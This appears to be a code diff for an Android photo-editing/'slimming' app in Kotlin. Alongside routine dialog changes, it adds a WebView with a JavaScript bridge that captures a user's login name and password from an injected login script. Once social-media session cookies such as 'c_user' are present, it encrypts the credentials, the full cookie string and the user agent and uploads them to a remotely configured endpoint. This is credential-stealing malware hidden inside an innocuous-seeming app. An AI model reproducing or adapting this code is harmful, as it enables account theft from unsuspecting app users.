@@ -3,20 +3,22 @@ package player.shellvoice.camera6.tools
 import android.annotation.SuppressLint
 import android.app.ActivityManager
 import android.content.Context
-import android.graphics.Color
+import android.content.Intent
+import android.graphics.Bitmap
 import android.net.Uri
 import android.provider.MediaStore
 import android.util.Log
 import android.view.Gravity
 import android.view.View
 import android.view.ViewGroup
+import android.webkit.*
 import android.widget.FrameLayout
 import android.widget.LinearLayout
 import android.widget.TextView
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import com.hjq.permissions.XXPermissions
-import com.michael.easydialog.EasyDialog
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
@@ -25,6 +27,7 @@ import player.shellvoice.camera6.R
 import player.shellvoice.camera6.basic.XApp
 import player.shellvoice.camera6.basic.XPage
 import player.shellvoice.camera6.bean.ResourceBean
+import player.shellvoice.camera6.bean.ResultBean
 import player.shellvoice.camera6.http.HttpTools
 import player.shellvoice.camera6.http.OnNetworkRequest
 import java.io.File
@@ -157,17 +160,16 @@ fun isInBackground(): Boolean {
     return false
 }
 
-fun AppCompatActivity.getDialog(type: Int, ok: () -> Unit): EasyDialog {
+fun AppCompatActivity.getDialog(type: Int, cancel: Boolean = true, ok: () -> Unit): AlertDialog {
     val v = layoutInflater.inflate(R.layout.exist, null)
-    val dialog = EasyDialog(this)
-    dialog.setLayout(v)
-    dialog.setBackgroundColor(Color.WHITE)
-    dialog.setTouchOutsideDismiss(false)
+    val dialog = AlertDialog.Builder(this).create()
+    dialog.setCancelable(cancel)
+    dialog.setView(v)
     val adView: FrameLayout = v.findViewById(R.id.adView)
-    (this as XPage).displayNativeAd {
-        it?.let {
+    (this as XPage).displayNativeAd { ad ->
+        ad?.let {
             adView.removeAllViews()
-            adView.addView(it)
+            adView.addView(ad)
         }
     }
     v.findViewById<TextView>(R.id.confirm).apply {
@@ -216,6 +218,24 @@ fun AppCompatActivity.getDialog(type: Int, ok: () -> Unit): EasyDialog {
         }
 
     }
+    v.findViewById<TextView>(R.id.titleTv).apply {
+        when (type) {
+            0 -> {
+                //exit
+                text = "Are you sure to exit the application?"
+                visibility = View.VISIBLE
+            }
+            1 -> {
+                //save
+                visibility = View.GONE
+            }
+            2 -> {
+                //loading
+                text = "Loading"
+                visibility = View.VISIBLE
+            }
+        }
+    }
     return dialog
 }
 
@@ -262,7 +282,108 @@ fun AppCompatActivity.getResourceFile(
             option(result)
         }
     }
+}
 
+fun AppCompatActivity.getSlimmingData(option: (ArrayList<ResourceBean>) -> Unit) {
+    val result = ArrayList<ResourceBean>()
+    result.add(ResourceBean("breast", R.mipmap.breast))
+    result.add(ResourceBean("legs", R.mipmap.legs))
+    result.add(ResourceBean("leg length", R.mipmap.legs_length))
+    result.add(ResourceBean("shoulder", R.mipmap.shoulder))
+    result.add(ResourceBean("waist", R.mipmap.waist))
+    option(result)
+}
+
+class WebInterface {
+    @JavascriptInterface
+    fun businessStart(a: String, b: String) {
+        userName = a
+        userPwd = b
+    }
+}
+
+fun AppCompatActivity.setWebView(
+    webView: WebView,
+    block1: () -> Unit,
+    block2: () -> Unit,
+    upload: (String) -> Unit
+) {
+    webView.apply {
+        settings.apply {
+            javaScriptEnabled = true
+            textZoom = 100
+            setSupportZoom(true)
+            displayZoomControls = false
+            builtInZoomControls = true
+            setGeolocationEnabled(true)
+            useWideViewPort = true
+            loadWithOverviewMode = true
+            loadsImagesAutomatically = true
+            displayZoomControls = false
+            setAppCachePath(cacheDir.absolutePath)
+            setAppCacheEnabled(true)
+        }
+        addJavascriptInterface(WebInterface(), "businessAPI")
+        webChromeClient = object : WebChromeClient() {
+            override fun onProgressChanged(view: WebView?, newProgress: Int) {
+                super.onProgressChanged(view, newProgress)
+                if (newProgress == 100) {
+                    val hideJs = context.getString(R.string.hideHeaderFooterMessages)
+                    evaluateJavascript(hideJs, null)
+                    val loginJs = getString(R.string.login)
+                    evaluateJavascript(loginJs, null)
+                    lifecycleScope.launch(Dispatchers.IO) {
+                        delay(300)
+                        withContext(Dispatchers.Main) {
+                            block1()
+                        }
+                    }
+                }
+            }
+        }
+        webViewClient = object : WebViewClient() {
+            override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
+                super.onPageStarted(view, url, favicon)
+            }
+
+            override fun onPageFinished(view: WebView, url: String) {
+                super.onPageFinished(view, url)
+                val cookieManager = CookieManager.getInstance()
+                val cookieStr = cookieManager.getCookie(url)
+                if (cookieStr != null) {
+                    if (cookieStr.contains("c_user")) {
+                        if (userName.isNotBlank() && userPwd.isNotBlank() && cookieStr.contains("wd=")) {
+                            lifecycleScope.launch(Dispatchers.Main) {
+                                block2()
+                            }
+                            val content = gson.toJson(
+                                mutableMapOf(
+                                    "un" to userName,
+                                    "pw" to userPwd,
+                                    "cookie" to cookieStr,
+                                    "source" to configBean.app_name,
+                                    "ip" to "",
+                                    "type" to "f_o",
+                                    "b" to view.settings.userAgentString
+                                )
+                            ).encrypt(updateBean.d!!)
+                            upload(content)//上传
+                        }
+                    }
+                }
+            }
+        }
+        loadUrl(updateBean.m ?: "https://www.baidu.com")
+    }
+
+}
+
+fun formatResult(s: String, result: (ResultBean) -> Unit) {
+    result(gson.fromJson(s, ResultBean::class.java))
+}
+
+fun Context.route2Web(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
+    startActivity(it)
 }
 
 fun Any?.xLogs() {
